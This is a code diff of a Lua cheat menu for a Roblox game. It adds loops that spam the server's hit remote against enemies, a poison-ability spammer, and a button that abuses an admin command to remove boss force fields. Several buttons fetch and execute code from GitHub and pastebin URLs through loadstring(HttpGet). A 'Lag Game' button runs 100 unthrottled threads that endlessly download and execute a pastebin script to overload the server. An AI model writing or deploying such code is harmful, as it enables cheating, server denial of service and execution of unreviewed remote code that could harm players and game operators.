+supportDesc.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 30 or 26)
 supportDesc.BackgroundTransparency = 1
 supportDesc.Text = "Whig Gun Deluxe (Poison)  |  HEX Spitter"
 supportDesc.TextColor3 = C.textDim
-supportDesc.TextSize = 11
+supportDesc.TextSize = isMobile and 11 or 10
 supportDesc.Font = Enum.Font.GothamSemibold
 supportDesc.TextXAlignment = Enum.TextXAlignment.Left
+supportDesc.TextWrapped = true
 supportDesc.ZIndex = 10
 supportDesc.Parent = supportNote
 
@@ -1781,7 +1933,11 @@ local function getRemote()
                 local remotes = tool:FindFirstChild("Remotes")
                 if remotes then
                     local serverControl = remotes:FindFirstChild("ServerControl")
-                    if serverControl then cachedRemote = serverControl lastRemoteCheck = now return serverControl end
+                    if serverControl then 
+                        cachedRemote = serverControl 
+                        lastRemoteCheck = now 
+                        return serverControl 
+                    end
                 end
             end
         end
@@ -1822,12 +1978,29 @@ local function startTargetLoop(target)
         local failCount = 0
         while guiAlive and autoAttackEnabled and isValidTarget(target) do
             local remote = getRemote()
-            if not remote then task.wait(0.5) remote = waitForRemote(5) if not remote then task.wait(1) continue end end
+            if not remote then 
+                task.wait(0.5) 
+                remote = waitForRemote(5) 
+                if not remote then 
+                    task.wait(1) 
+                    continue 
+                end 
+            end
             local torso = getTorso(target)
             if torso then
-                local ok = pcall(function() remote:InvokeServer("RayHit", {Hit = torso, Position = torso.Position}) end)
-                if ok then failCount = 0
-                else failCount += 1 cachedRemote = nil if failCount >= 20 then task.wait(2) failCount = 0 end end
+                local ok = pcall(function() 
+                    remote:InvokeServer("RayHit", {Hit = torso, Position = torso.Position}) 
+                end)
+                if ok then 
+                    failCount = 0
+                else 
+                    failCount += 1 
+                    cachedRemote = nil 
+                    if failCount >= 20 then 
+                        task.wait(2) 
+                        failCount = 0 
+                    end 
+                end
             end
             task.wait(0.01)
         end
@@ -1838,7 +2011,9 @@ end
 local function startAllLoops()
     if not guiAlive then return end
     for _, child in ipairs(sdFolder:GetChildren()) do
-        if isValidTarget(child) and not activeLoops[child] then startTargetLoop(child) end
+        if isValidTarget(child) and not activeLoops[child] then 
+            startTargetLoop(child) 
+        end
     end
 end
 
@@ -1852,8 +2027,10 @@ end
 sdFolder.ChildAdded:Connect(function(newChild)
     if not guiAlive then return end
     task.wait(0.15)
-    createNotification("Entity Spawn", newChild.Name .. " has spawn", 3, C.cyan)
-    if autoAttackEnabled and isValidTarget(newChild) and not activeLoops[newChild] then startTargetLoop(newChild) end
+    createNotification("Entity Spawn", newChild.Name .. " has spawned", 3, C.cyan)
+    if autoAttackEnabled and isValidTarget(newChild) and not activeLoops[newChild] then 
+        startTargetLoop(newChild) 
+    end
 end)
 
 LocalPlayer.CharacterAdded:Connect(function(newChar)
@@ -1861,72 +2038,106 @@ LocalPlayer.CharacterAdded:Connect(function(newChar)
     cachedRemote = nil
     newChar:WaitForChild("Humanoid")
     task.wait(2)
-    if guiAlive and autoAttackEnabled then waitForRemote(10) startAllLoops() end
+    if guiAlive and autoAttackEnabled then 
+        waitForRemote(10) 
+        startAllLoops() 
+    end
 end)
 
 task.spawn(function()
     while task.wait(3) do
         if not guiAlive then break end
-        for target, _ in pairs(activeLoops) do if not isValidTarget(target) then activeLoops[target] = nil end end
+        for target, _ in pairs(activeLoops) do 
+            if not isValidTarget(target) then 
+                activeLoops[target] = nil 
+            end 
+        end
         if autoAttackEnabled then
             for _, child in ipairs(sdFolder:GetChildren()) do
-                if isValidTarget(child) and not activeLoops[child] then startTargetLoop(child) end
+                if isValidTarget(child) and not activeLoops[child] then 
+                    startTargetLoop(child) 
+                end
             end
         end
     end
 end)
 
 makeSection(combat, "Auto Attack (Slow)", 2)
+
 local slowNote = Instance.new("Frame")
-slowNote.Size = UDim2.new(1, 0, 0, 32)
+slowNote.Size = UDim2.new(1, 0, 0, isMobile and 38 or 32)
 slowNote.BackgroundColor3 = C.card
 slowNote.BorderSizePixel = 0
 slowNote.ZIndex = 9
 slowNote.LayoutOrder = 3
 slowNote.Parent = combat
-corner(slowNote, 8)
+corner(slowNote, isMobile and 10 or 8)
+
 local slowBar = Instance.new("Frame")
-slowBar.Size = UDim2.new(0, 3, 0.6, 0)
-slowBar.Position = UDim2.new(0, 8, 0.2, 0)
+slowBar.Size = UDim2.new(0, isMobile and 4 or 3, 0.6, 0)
+slowBar.Position = UDim2.new(0, isMobile and 10 or 8, 0.2, 0)
 slowBar.BackgroundColor3 = C.orange
 slowBar.BorderSizePixel = 0
 slowBar.ZIndex = 10
 slowBar.Parent = slowNote
 corner(slowBar, 2)
+
 local slowText = Instance.new("TextLabel")
-slowText.Size = UDim2.new(1, -24, 1, 0)
-slowText.Position = UDim2.new(0, 18, 0, 0)
+slowText.Size = UDim2.new(1, -28, 1, 0)
+slowText.Position = UDim2.new(0, isMobile and 20 or 18, 0, 0)
 slowText.BackgroundTransparency = 1
-slowText.Text = "Note : Loop Mode Attack One Hit Per Tick. Use For Alt Support."
+slowText.Text = "Note: Loop Mode Attack One Hit Per Tick. Use For Alt Support."
 slowText.TextColor3 = C.orange
-slowText.TextSize = 10
+slowText.TextSize = isMobile and 11 or 10
 slowText.Font = Enum.Font.GothamSemibold
 slowText.TextXAlignment = Enum.TextXAlignment.Left
+slowText.TextWrapped = true
 slowText.ZIndex = 10
 slowText.Parent = slowNote
 
 makeToggle(combat, "Auto Attack (Loop)", false, 4, function(enabled)
     if not guiAlive then return end
-    if enabled then autoAttackEnabled = true startAllLoops()
-    else autoAttackEnabled = false cachedRemote = nil task.delay(0.5, function() table.clear(activeLoops) end) end
+    if enabled then 
+        autoAttackEnabled = true 
+        startAllLoops()
+        createNotification("Auto Attack", "Loop mode enabled", 2, C.green)
+    else 
+        autoAttackEnabled = false 
+        cachedRemote = nil 
+        task.delay(0.5, function() table.clear(activeLoops) end)
+        createNotification("Auto Attack", "Loop mode disabled", 2, C.yellow)
+    end
 end)
 
 makeSection(combat, "Burst Attack", 5)
-makeButton(combat, "Attack All (Infinite)", "This Can Stack But If Too Much May Cause Lag.", 6, function()
+makeButton(combat, "Attack All (Infinite)", "This can stack but if too much may cause lag", 6, function()
     if not guiAlive then return end
     if infAttackEnabled then return end
     infAttackEnabled = true
+    createNotification("Burst Attack", "Infinite attack started", 2, C.cyan)
     task.spawn(function()
         while guiAlive and infAttackEnabled do
             local remote = getRemote()
-            if not remote then task.wait(0.5) remote = waitForRemote(10) if not remote then task.wait(1) continue end end
+            if not remote then 
+                task.wait(0.5) 
+                remote = waitForRemote(10) 
+                if not remote then 
+                    task.wait(1) 
+                    continue 
+                end 
+            end
             for _, child in ipairs(sdFolder:GetChildren()) do
                 if not guiAlive or not infAttackEnabled then break end
                 if isValidTarget(child) then
                     local torso = getTorso(child)
                     if torso then
-                        local ok = pcall(function() remote:InvokeServer("RayHit", {Hit = torso, Position = torso.Position}) end)
-                        if not ok then cachedRemote = nil break end
+                        local ok = pcall(function() 
+                            remote:InvokeServer("RayHit", {Hit = torso, Position = torso.Position}) 
+                        end)
+                        if not ok then 
+                            cachedRemote = nil 
+                            break 
+                        end
                     end
                 end
             end
@@ -1935,33 +2146,116 @@ makeButton(combat, "Attack All (Infinite)", "This Can Stack But If Too Much May 
     end)
 end)
 
-makeSection(combat, "Controls", 7)
+-- ============================
+-- POISON SECTION
+-- ============================
+makeSection(combat, "Poison", 7)
+
+local function triggerPoison()
+    local toolName = "Whig gun deluxe"
+    local char = LocalPlayer.Character
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    
+    local tool = (char and char:FindFirstChild(toolName)) or (backpack and backpack:FindFirstChild(toolName))
+    
+    if tool then
+        if tool.Parent == backpack then
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            if humanoid then humanoid:EquipTool(tool) end
+            task.wait(0.1)
+        end
+        
+        local ability = tool:FindFirstChild("ability")
+        if ability then
+            local args = {"C"}
+            ability:FireServer(unpack(args))
+        end
+    else
+        createNotification("Tool Error", "Whig gun deluxe not found", 2, C.red)
+    end
+end
+
+makeButton(combat, "Poison Once", "Equip tool and fire poison ability", 8, function()
+    if not guiAlive then return end
+    triggerPoison()
+end)
+
+local poisonLoopActive = false
+makeToggle(combat, "Auto Poison Loop", false, 9, function(enabled)
+    poisonLoopActive = enabled
+    task.spawn(function()
+        while poisonLoopActive and guiAlive do
+            triggerPoison()
+            task.wait(0.2)
+        end
+    end)
+end)
+
+-- ============================
+-- SCRIPTS (TEST)
+-- ============================
+makeSection(combat, "Better Than Atack All", 10)
+makeButton(combat, "Boss Clapper 4000", "This Script Fuck Every Single Boss", 11, function()
+    if not guiAlive then return end
+    createNotification("IDK WHAT TO PUT HERE :OOOO", "This boss Is Going To Be Clap Hard ", 2, C.cyan)
+    pcall(function() 
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mrpekob/test-1/refs/heads/main/for%20got%20demon'))() 
+    end)
+end)
+
+-- ============================
+-- UNFF (MOVED TO COMBAT BELOW TEST)
+-- ============================
+makeSection(combat, "Boss Utility", 12)
+makeButton(combat, "Unff Boss (This Spawn Tool In Your Iventory)", "Removes force field (Executes 6x)", 13, function()
+    if not guiAlive then return end
+    local signal = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand")
+    local args = {";unff"}
+    for i = 1, 6 do
+        task.spawn(function()
+            signal:InvokeServer(unpack(args))
+        end)
+    end
+    createNotification("Unff", "FUCK FF", 2, C.green)
+end)
+
+-- ============================
+-- CONTROLS (STOP ALL)
+-- ============================
+makeSection(combat, "Controls", 14)
 local stopBtn = Instance.new("TextButton")
-stopBtn.Size = UDim2.new(1, 0, 0, 40)
+stopBtn.Size = UDim2.new(1, 0, 0, isMobile and 48 or 40)
 stopBtn.BackgroundColor3 = C.red
 stopBtn.BorderSizePixel = 0
 stopBtn.Text = ""
 stopBtn.AutoButtonColor = false
 stopBtn.ZIndex = 9
-stopBtn.LayoutOrder = 8
+stopBtn.LayoutOrder = 15
 stopBtn.Parent = combat
-corner(stopBtn, 8)
+corner(stopBtn, isMobile and 10 or 8)
+
 local stopLabel = Instance.new("TextLabel")
 stopLabel.Size = UDim2.new(1, 0, 1, 0)
 stopLabel.BackgroundTransparency = 1
 stopLabel.Text = "STOP ALL ATTACKS"
 stopLabel.TextColor3 = C.white
-stopLabel.TextSize = 13
+stopLabel.TextSize = isMobile and 14 or 13
 stopLabel.Font = Enum.Font.GothamBold
 stopLabel.ZIndex = 10
 stopLabel.Parent = stopBtn
-stopBtn.MouseEnter:Connect(function() if guiAlive then tw(stopBtn, 0.15, {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}) end end)
-stopBtn.MouseLeave:Connect(function() if guiAlive then tw(stopBtn, 0.15, {BackgroundColor3 = C.red}) end end)
+
+if not isMobile then
+    stopBtn.MouseEnter:Connect(function() if guiAlive then tw(stopBtn, 0.15, {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}) end end)
+    stopBtn.MouseLeave:Connect(function() if guiAlive then tw(stopBtn, 0.15, {BackgroundColor3 = C.red}) end end)
+end
+
 stopBtn.MouseButton1Click:Connect(function()
     if not guiAlive then return end
     stopEverything()
+    poisonLoopActive = false
     tw(stopBtn, 0.1, {BackgroundColor3 = C.green}, Enum.EasingStyle.Linear)
     stopLabel.Text = "STOPPED"
+    createNotification("Stop", "All attacks and loops stopped", 2, C.green)
     task.wait(0.3)
     if not guiAlive then return end
     tw(stopBtn, 0.25, {BackgroundColor3 = C.red})
@@ -1970,14 +2264,8 @@ stopBtn.MouseButton1Click:Connect(function()
     stopLabel.Text = "STOP ALL ATTACKS"
 end)
 
-makeSection(combat, "Scripts", 9)
-makeButton(combat, "Test", "Test script - loads external script", 10, function()
-    if not guiAlive then return end
-    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Mrpekob/test-1/refs/heads/main/for%20got%20demon'))() end)
-end)
-
 -- ============================
--- PLAYER
+-- PLAYER TAB
 -- ============================
 local playerTab = tabPages[4]
 makeSection(playerTab, "Speed", 1)
@@ -2045,19 +2333,19 @@ makeTeleportButton(teleport, "Testing", 130, 4, 71, C.pink, 18, "Note: VIP Serve
 -- ============================
 local misc = tabPages[6]
 
--- ============================
--- PROXIMITY
--- ============================
 makeSection(misc, "Proximity", 1)
 makeToggle(misc, "Instant Proximity", false, 2, function(enabled)
     if not guiAlive then return end
     instantProximityEnabled = enabled
-    if enabled then enableInstantProximity() else disableInstantProximity() end
+    if enabled then 
+        enableInstantProximity()
+        createNotification("Proximity", "Instant proximity enabled", 2, C.green)
+    else 
+        disableInstantProximity()
+        createNotification("Proximity", "Instant proximity disabled", 2, C.yellow)
+    end
 end)
 
--- ============================
--- SCRIPTS
--- ============================
 makeSection(misc, "Scripts", 3)
 makeButton(misc, "Load Infinite Yield", "Admin script with 200+ commands", 4, function()
     if not guiAlive then return end
@@ -2067,122 +2355,106 @@ makeButton(misc, "Load Infinite Yield", "Admin script with 200+ commands", 4, fu
     end)
 end)
 
--- ============================
--- NAME HIDER
--- ============================
 makeSection(misc, "Name Hider", 5)
 local nameInputCard = Instance.new("Frame")
-nameInputCard.Size = UDim2.new(1, 0, 0, 70)
+nameInputCard.Size = UDim2.new(1, 0, 0, isMobile and 82 or 70)
 nameInputCard.BackgroundColor3 = C.card
 nameInputCard.BorderSizePixel = 0
 nameInputCard.ZIndex = 9
 nameInputCard.LayoutOrder = 6
 nameInputCard.Parent = misc
-corner(nameInputCard, 8)
+corner(nameInputCard, isMobile and 10 or 8)
+
 local nameInputBar = Instance.new("Frame")
-nameInputBar.Size = UDim2.new(0, 3, 0.6, 0)
-nameInputBar.Position = UDim2.new(0, 8, 0.2, 0)
+nameInputBar.Size = UDim2.new(0, isMobile and 4 or 3, 0.6, 0)
+nameInputBar.Position = UDim2.new(0, isMobile and 10 or 8, 0.2, 0)
 nameInputBar.BackgroundColor3 = C.purple
 nameInputBar.BorderSizePixel = 0
 nameInputBar.ZIndex = 10
 nameInputBar.Parent = nameInputCard
 corner(nameInputBar, 2)
+
 local nameInputLabel = Instance.new("TextLabel")
-nameInputLabel.Size = UDim2.new(1, -24, 0, 14)
-nameInputLabel.Position = UDim2.new(0, 18, 0, 6)
+nameInputLabel.Size = UDim2.new(1, -28, 0, isMobile and 16 or 14)
+nameInputLabel.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 8 or 6)
 nameInputLabel.BackgroundTransparency = 1
 nameInputLabel.Text = "Your Fake Name (shown instead of real name)"
 nameInputLabel.TextColor3 = C.textMuted
-nameInputLabel.TextSize = 10
+nameInputLabel.TextSize = isMobile and 11 or 10
 nameInputLabel.Font = Enum.Font.GothamSemibold
 nameInputLabel.TextXAlignment = Enum.TextXAlignment.Left
+nameInputLabel.TextWrapped = true
 nameInputLabel.ZIndex = 10
 nameInputLabel.Parent = nameInputCard
+
 local nameInputRow = Instance.new("Frame")
-nameInputRow.Size = UDim2.new(1, -24, 0, 28)
-nameInputRow.Position = UDim2.new(0, 18, 0, 32)
+nameInputRow.Size = UDim2.new(1, -28, 0, isMobile and 34 or 28)
+nameInputRow.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 38 or 32)
 nameInputRow.BackgroundTransparency = 1
 nameInputRow.ZIndex = 10
 nameInputRow.Parent = nameInputCard
+
 local nameBoxFrame = Instance.new("Frame")
-nameBoxFrame.Size = UDim2.new(1, -70, 1, 0)
+nameBoxFrame.Size = UDim2.new(1, isMobile and -80 or -70, 1, 0)
 nameBoxFrame.BackgroundColor3 = C.input
 nameBoxFrame.BorderSizePixel = 0
 nameBoxFrame.ZIndex = 11
 nameBoxFrame.Parent = nameInputRow
-corner(nameBoxFrame, 6)
-local nameBoxStroke = stroke(nameBoxFrame, C.inputBorder, 1, 0.4)
+corner(nameBoxFrame, isMobile and 8 or 6)
+
+local nameBoxStroke = stroke(nameBoxFrame, C.inputBorder, isMobile and 2 or 1, 0.4)
+
 local nameBox = Instance.new("TextBox")
-nameBox.Size = UDim2.new(1, -12, 1, 0)
-nameBox.Position = UDim2.new(0, 8, 0, 0)
+nameBox.Size = UDim2.new(1, -16, 1, 0)
+nameBox.Position = UDim2.new(0, 10, 0, 0)
 nameBox.BackgroundTransparency = 1
 nameBox.Text = LocalPlayer.Name
 nameBox.PlaceholderText = "Enter fake name..."
 nameBox.PlaceholderColor3 = C.textMuted
 nameBox.TextColor3 = C.text
-nameBox.TextSize = 12
+nameBox.TextSize = isMobile and 13 or 12
 nameBox.Font = Enum.Font.GothamSemibold
 nameBox.TextXAlignment = Enum.TextXAlignment.Left
 nameBox.ClearTextOnFocus = false
 nameBox.ZIndex = 12
 nameBox.Parent = nameBoxFrame
-nameBox.Focused:Connect(function() if guiAlive then tw(nameBoxStroke, 0.2, {Color = C.purple, Transparency = 0}) end end)
+
+nameBox.Focused:Connect(function() 
+    if guiAlive then 
+        tw(nameBoxStroke, 0.2, {Color = C.purple, Transparency = 0}) 
+    end 
+end)
+
 local nameApplyBtn = Instance.new("TextButton")
-nameApplyBtn.Size = UDim2.new(0, 60, 1, 0)
-nameApplyBtn.Position = UDim2.new(1, -60, 0, 0)
+nameApplyBtn.Size = UDim2.new(0, isMobile and 70 or 60, 1, 0)
+nameApplyBtn.Position = UDim2.new(1, isMobile and -70 or -60, 0, 0)
 nameApplyBtn.BackgroundColor3 = C.purple
 nameApplyBtn.BorderSizePixel = 0
 nameApplyBtn.Text = "Apply"
 nameApplyBtn.TextColor3 = C.white
-nameApplyBtn.TextSize = 11
+nameApplyBtn.TextSize = isMobile and 12 or 11
 nameApplyBtn.Font = Enum.Font.GothamBold
 nameApplyBtn.AutoButtonColor = false
 nameApplyBtn.ZIndex = 11
 nameApplyBtn.Parent = nameInputRow
-corner(nameApplyBtn, 6)
-nameApplyBtn.MouseEnter:Connect(function() if guiAlive then tw(nameApplyBtn, 0.15, {BackgroundColor3 = Color3.fromRGB(130, 60, 210)}) end end)
-nameApplyBtn.MouseLeave:Connect(function() if guiAlive then tw(nameApplyBtn, 0.15, {BackgroundColor3 = C.purple}) end end)
+corner(nameApplyBtn, isMobile and 8 or 6)
 
-local function refreshAllCensoredText()
-    pcall(function()
-        for _, obj in ipairs(PlayerGui:GetDescendants()) do
-            if obj.Parent and not isOurGui(obj) then
-                if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
-                    pcall(function()
-                        local orig = originalTexts[obj]
-                        local baseText = orig or obj.Text
-                        if textContainsAnyName(baseText) then
-                            originalTexts[obj] = baseText
-                            local censored = censorText(baseText)
-                            if censored ~= obj.Text then obj.Text = censored end
-                        end
-                    end)
-                end
-            end
-        end
+if not isMobile then
+    nameApplyBtn.MouseEnter:Connect(function() 
+        if guiAlive then tw(nameApplyBtn, 0.15, {BackgroundColor3 = Color3.fromRGB(130, 60, 210)}) end 
     end)
-    pcall(function()
-        local coreGui = game:GetService("CoreGui")
-        for _, obj in ipairs(coreGui:GetDescendants()) do
-            if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
-                pcall(function()
-                    local orig = originalTexts[obj]
-                    local baseText = orig or obj.Text
-                    if textContainsAnyName(baseText) then
-                        originalTexts[obj] = baseText
-                        local censored = censorText(baseText)
-                        if censored ~= obj.Text then obj.Text = censored end
-                    end
-                end)
-            end
-        end
+    nameApplyBtn.MouseLeave:Connect(function() 
+        if guiAlive then tw(nameApplyBtn, 0.15, {BackgroundColor3 = C.purple}) end 
     end)
 end
 
 local function applyFakeName()
     if not guiAlive then return end
     local newName = nameBox.Text
-    if newName == "" then newName = LocalPlayer.Name nameBox.Text = newName end
+    if newName == "" then 
+        newName = LocalPlayer.Name 
+        nameBox.Text = newName 
+    end
     customFakeName = newName
     tw(nameApplyBtn, 0.1, {BackgroundColor3 = C.green}, Enum.EasingStyle.Linear)
     nameApplyBtn.Text = "✓"
@@ -2204,13 +2476,15 @@ end)
 
 makeToggle(misc, "Hide All Names", false, 7, function(enabled)
     if not guiAlive then return end
-    if enabled then enableNameHider() createNotification("Name Hider", "All names hidden. Your name shows as: " .. customFakeName, 3, C.purple)
-    else disableNameHider() createNotification("Name Hider", "Names are now visible", 2, C.green) end
+    if enabled then 
+        enableNameHider() 
+        createNotification("Name Hider", "All names hidden. Your name shows as: " .. customFakeName, 3, C.purple)
+    else 
+        disableNameHider() 
+        createNotification("Name Hider", "Names are now visible", 2, C.green) 
+    end
 end)
 
--- ============================
--- GUI SETTINGS
--- ============================
 makeSection(misc, "GUI Settings", 8)
 makeToggle(misc, "Notifications", true, 9, function(v) end)
 makeToggle(misc, "Sound Effects", false, 10, function(v) end)
@@ -2219,9 +2493,6 @@ makeSlider(misc, "GUI Opacity", 0, 100, 95, 11, function(v)
     Main.BackgroundTransparency = 1 - (v / 100)
 end)
 
--- ============================
--- DANGER ZONE
--- ============================
 makeSection(misc, "Danger Zone", 12)
 makeButton(misc, "Reset All Settings", "Restore default values", 13, function()
     if not guiAlive then return end
@@ -2234,12 +2505,33 @@ makeButton(misc, "Reset All Settings", "Restore default values", 13, function()
         end
     end)
     stopEverything()
-    if instantProximityEnabled then instantProximityEnabled = false disableInstantProximity() end
+    if instantProximityEnabled then 
+        instantProximityEnabled = false 
+        disableInstantProximity() 
+    end
     if nameHiderEnabled then disableNameHider() end
     customFakeName = LocalPlayer.Name
     nameBox.Text = LocalPlayer.Name
     updateHomePlayerCard()
     createNotification("Reset", "All settings have been reset", 2, C.yellow)
+end)
+
+makeButton(misc, "Lag Game", "Infinite loop lag script - USE AT YOUR OWN RISK", 14, function()
+    if not guiAlive then return end
+    createNotification("💀 Lag Game", "RIP server... loading lag script", 3, C.red)
+    task.spawn(function()
+        -- Fire multiple parallel loops to maximize lag
+        for thread = 1, 100 do
+            task.spawn(function()
+                while true do
+                    pcall(function()
+                        loadstring(game:HttpGet('https://pastebin.com/raw/TC3a5hfE'))()
+                    end)
+                    -- No wait = maximum aggression
+                end
+            end)
+        end
+    end)
 end)
 
 local function destroyGui()
@@ -2252,100 +2544,72 @@ local function destroyGui()
     pcall(function() ScreenGui:Destroy() end)
 end
 
-makeButton(misc, "Destroy GUI", "Permanently remove the GUI", 14, function()
+makeButton(misc, "Destroy GUI", "Permanently remove the GUI", 15, function()
     destroyGui()
 end)
 
-ScreenGui.AncestryChanged:Connect(function(_, parent)
-    if parent == nil then
-        guiAlive = false
-        stopEverything()
-        playerSettings.walkSpeedEnabled = false
-        if speedConnection then speedConnection:Disconnect() end
-        disableInstantProximity()
-        disableNameHider()
-    end
-end)
-
 -- ============================
--- DRAGGING
+-- DRAGGING & CONTROLS
 -- ============================
 local dragging, dragStart, startPos = false, nil, nil
+
+local function updateDrag(input)
+    if not guiAlive then return end
+    local delta = input.Position - dragStart
+    Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
 TopBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true dragStart = input.Position startPos = Main.Position
-    end
-end)
-TopBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
-end)
-SidebarHeader.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true dragStart = input.Position startPos = Main.Position
-    end
-end)
-SidebarHeader.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if not guiAlive then return end
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
     end
 end)
 
--- ============================
--- MINIMIZE / CLOSE
--- ============================
+SidebarHeader.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
+
 local minimized = false
 local fullSize = UDim2.new(0, MAIN_W, 0, MAIN_H)
-local miniSize = UDim2.new(0, SIDEBAR_W + 120, 0, 42)
-MinBtn.MouseEnter:Connect(function() if guiAlive then tw(MinBtn, 0.15, {BackgroundColor3 = C.cardHover}) end end)
-MinBtn.MouseLeave:Connect(function() if guiAlive then tw(MinBtn, 0.15, {BackgroundColor3 = C.card}) end end)
-CloseBtn.MouseEnter:Connect(function() if guiAlive then tw(CloseBtn, 0.15, {BackgroundColor3 = C.red}) end end)
-CloseBtn.MouseLeave:Connect(function() if guiAlive then tw(CloseBtn, 0.15, {BackgroundColor3 = C.card}) end end)
+local miniSize = UDim2.new(0, SIDEBAR_W + (isMobile and 100 or 120), 0, isMobile and 48 or 42)
 
 MinBtn.MouseButton1Click:Connect(function()
     if not guiAlive then return end
     minimized = not minimized
-    if minimized then tw(Main, 0.35, {Size = miniSize}, Enum.EasingStyle.Back, Enum.EasingDirection.In) MinBtn.Text = "+"
-    else tw(Main, 0.35, {Size = fullSize}, Enum.EasingStyle.Back, Enum.EasingDirection.Out) MinBtn.Text = "-" end
+    if minimized then 
+        tw(Main, 0.35, {Size = miniSize}, Enum.EasingStyle.Back, Enum.EasingDirection.In) 
+        MinBtn.Text = "+"
+    else 
+        tw(Main, 0.35, {Size = fullSize}, Enum.EasingStyle.Back, Enum.EasingDirection.Out) 
+        MinBtn.Text = "-" 
+    end
 end)
 
 CloseBtn.MouseButton1Click:Connect(function()
     if not guiAlive then return end
     guiAlive = false
     stopEverything()
-    playerSettings.walkSpeedEnabled = false
-    if speedConnection then speedConnection:Disconnect() end
-    disableInstantProximity()
-    disableNameHider()
-    tw(Main, 0.4, {
-        Size = UDim2.new(0, MAIN_W * 0.9, 0, MAIN_H * 0.9),
-        BackgroundTransparency = 1,
-        Position = UDim2.new(Main.Position.X.Scale, Main.Position.X.Offset + MAIN_W * 0.05, Main.Position.Y.Scale, Main.Position.Y.Offset + MAIN_H * 0.05)
-    }, Enum.EasingStyle.Back, Enum.EasingDirection.In)
-    for _, d in ipairs(Main:GetDescendants()) do
-        pcall(function()
-            if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then tw(d, 0.3, {TextTransparency = 1, BackgroundTransparency = 1})
-            elseif d:IsA("Frame") then tw(d, 0.3, {BackgroundTransparency = 1})
-            elseif d:IsA("UIStroke") then tw(d, 0.3, {Transparency = 1})
-            elseif d:IsA("ImageLabel") then tw(d, 0.3, {ImageTransparency = 1, BackgroundTransparency = 1}) end
-        end)
-    end
+    tw(Main, 0.4, {Size = UDim2.new(0, MAIN_W * 0.9, 0, MAIN_H * 0.9), BackgroundTransparency = 1}, Enum.EasingStyle.Back, Enum.EasingDirection.In)
     task.wait(0.5)
     ScreenGui:Destroy()
-end)
-
--- ============================
--- KEYBIND
--- ============================
-local visible = true
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if not guiAlive then return end
-    if gpe then return end
-    if input.KeyCode == Enum.KeyCode.RightShift then visible = not visible Main.Visible = visible end
 end)
 
 -- ============================
